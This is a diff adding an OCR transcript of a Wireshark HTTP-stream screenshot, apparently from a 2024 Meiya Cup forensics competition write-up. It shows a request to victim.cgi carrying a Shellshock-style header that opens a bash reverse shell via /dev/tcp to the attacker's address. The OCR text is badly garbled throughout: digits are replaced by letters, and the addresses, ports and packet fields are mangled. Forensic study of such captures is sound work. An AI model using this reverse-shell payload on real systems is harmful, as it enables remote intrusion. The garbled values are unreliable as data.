@@ -1,0 +1,20 @@
+# OCR: bda4fdb24ff8d9bf53d2b3401efe3d7a.webp
+# 来源: ./02-WriteUp/2024/2024-美亚杯-团队赛/bda4fdb24ff8d9bf53d2b3401efe3d7a.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:21
+
+5370.532858 54 70.533632 557.533738 5670.534055 577e.534660
+192.168.233.129 192.168.233.138 192.168.233.129 192.168.233.129 192.168.233.13
+192.168.233.130 192.168.233.129 192.168.233.130 192.168.233.130 192.168.233.129
+ Wireshark·追腺 HTTP流 (tep.stream eq 2) -2.pcap
+GET/victim.cgiHTTP/1.1 Host:192.168.233.13e:8e82 Cache-Control:max-age=e Upgrade-Insecure-Request
+TCP TCP TCP HTTP TCP
+7438984+8e82[SYN]Seq=0Win=3212eLen=eM55=146eSACK_PERMTSval=2791028062T5ecr=1 748e82+38984[SYN,ACK]Seq=eAck=1Win=6516e Len=eMSS=146eSACK_PERMTSval=1e50995e3
+6638984→8e82[ACk]Seq=1Ack=1Win=32128Len=eTSval=2791e2863TSecr=1e5e99539 491GET/victim.cgiHTTP/1.1
+66882+38984[ACK]Seq=1Ack=426Win=64768Len=eTSval=185e99584eTSecr=2791e28063
+()(i)echo:/bin/bash-i>&/dev/tcp/192.168.233.129/98ee@>&1
+User-Agent:
+Accept:text/html,application/xhtml+xml,application/xml;q=e.9,image/avif,image/webp,image/apng.*/";q=e.8,application/signed-exchange;v=b3;q=e.7 Accept-Encoding:gzip,deflate,br
+en-Us,en;q=e.9
+Accept-Language: Connection: close
